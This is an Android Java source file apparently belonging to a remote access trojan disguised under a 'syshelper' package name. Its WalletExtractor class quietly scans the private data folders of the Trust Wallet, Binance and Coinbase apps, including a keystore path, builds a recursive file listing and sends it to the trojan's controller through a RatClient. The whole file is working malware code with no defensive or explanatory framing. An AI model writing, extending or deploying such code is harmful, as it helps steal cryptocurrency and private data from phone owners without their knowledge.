package com.syshelper.service;
import android.content.Context;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;

public class WalletExtractor {
    private final Context ctx;
    private final RatClient client;

    public WalletExtractor(Context ctx, RatClient client) { this.ctx = ctx; this.client = client; }

    public void extractAll() {
        new Thread(() -> {
            JSONArray wallets = new JSONArray();
            String[] paths = {"/data/data/com.wallet.crypto.trustapp/files/keystore", "/data/data/com.binance.dev/files", "/data/data/com.coinbase.android/files"};
            for (String path : paths) {
                File f = new File(path);
                if (f.exists()) {
                    try { JSONObject w = new JSONObject(); w.put("path", path); w.put("files", listDir(f)); wallets.put(w); } catch (Exception ignored) {}
                }
            }
            client.sendResult("wallet_extract", wallets);
        }).start();
    }

    private JSONArray listDir(File dir) {
        JSONArray arr = new JSONArray();
        File[] files = dir.listFiles();
        if (files != null) for (File f : files) {
            try { JSONObject item = new JSONObject(); item.put("name", f.getName()); item.put("dir", f.isDirectory()); if (f.isDirectory()) item.put("children", listDir(f)); else item.put("size", f.length()); arr.put(item); } catch (Exception ignored) {}
        }
        return arr;
    }
}
